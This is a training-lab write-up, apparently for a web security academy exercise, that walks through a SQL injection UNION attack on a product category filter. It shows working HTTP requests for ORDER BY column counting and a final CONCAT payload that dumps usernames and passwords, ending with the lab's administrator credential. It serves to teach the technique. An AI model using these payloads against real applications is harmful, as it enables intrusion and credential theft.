# Lab 06: SQL injection UNION attack, retrieving multiple values in a single column

## Description

 This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a `UNION` attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform an SQL injection `UNION` attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user. 

---

## Solution


The product category filter is the HTTP query parameter `category`. Since this attack involves reading data from a different database table, we will leverage the `UNION` operator.

The first step is to determine how many columns are in the result from the original `SELECT` statement. Leverage the iterative `ORDER BY` method.

Both `ORDER BY 1` and `ORDER BY 2` return an HTTP 200.

```http
GET /filter?category=Gifts'+ORDER+BY+1-- HTTP/1.1
Host: acd61f941e70e32b80c4134c008c0015.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 4417
```

```http
GET /filter?category=Gifts'+ORDER+BY+2-- HTTP/1.1
Host: acd61f941e70e32b80c4134c008c0015.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 4417
```

However, an `ORDER BY 3` returns an HTTP 500 error.

```http
GET /filter?category=Gifts'+ORDER+BY+3-- HTTP/1.1
Host: acd61f941e70e32b80c4134c008c0015.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

```http
HTTP/1.1 500 Internal Server Error
Connection: close
Content-Length: 21

Internal Server Error
```

This indicates that the original `SELECT` statement returns a 2-column table.

Now we need to determine the data types of the columns. By inspecting the ordering of the table entries when we use `ORDER BY 1` and `ORDER BY 2`, it appears that a product ID number is at index 1 and the name of the product is at index 2. These columns appear to be of type integer and string, respectively. This can be confirmed by iteratively injecting `UNION SELECT NULL` statements.

We are trying to read two (presumably) string columns from the `users` table (`username` and `password)`, but we only have one string column in the results of the original `SELECT` statement. We could use two separate injections: one to retrieve the usernames and one to retrieve the passwords. Alternatively, we can use string concatenation to get both the username and password in a single request. The backend database system appears to be MySQL, whose concatenation operator is the [CONCAT() function](https://www.w3resource.com/mysql/string-functions/mysql-concat-function.php).

Leveraging concatenation, the final injection is:

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,CONCAT(username,':',password)+FROM+users-- HTTP/1.1
Host: acd61f941e70e32b80c4134c008c0015.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

which renders in the `administrator` credentials.

```html
...
<tr>
	<th>administrator:7pgy2xrgn8ew68ga59s9</th>
</tr>
...
```